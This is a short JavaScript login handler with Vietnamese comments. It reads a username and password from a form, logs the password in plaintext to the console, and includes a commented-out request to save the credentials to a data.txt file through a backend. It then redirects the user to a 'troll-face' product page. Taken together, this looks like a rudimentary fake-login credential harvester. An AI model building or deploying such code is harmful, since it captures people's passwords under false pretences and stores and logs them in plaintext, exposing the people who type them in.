function loginUser() {
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    // Kiểm tra nếu người dùng đã nhập đủ thông tin
    if (username && password) {
        // Lưu trữ thông tin tài khoản vào file data.txt (giả lập ở đây, không thực hiện được thực tế do hạn chế trình duyệt)
        saveData(username, password);

        // Chuyển hướng người dùng tới trang sau khi đăng nhập thành công
        window.location.href = "https://youtooz.com/products/troll-face";
        return false;
    }

    alert("Please enter both username and password!");
    return false;
}

function saveData(username, password) {
    // Gửi dữ liệu lên server để lưu trữ (ở đây chỉ là minh họa)
    console.log(`Saving user: ${username}, password: ${password}`);

    // Trong thực tế, bạn sẽ cần sử dụng backend (PHP, Node.js, ...) để ghi file data.txt
    // fetch('/saveData', {
    //     method: 'POST',
    //     headers: { 'Content-Type': 'application/json' },
    //     body: JSON.stringify({ username, password })
    // });
}
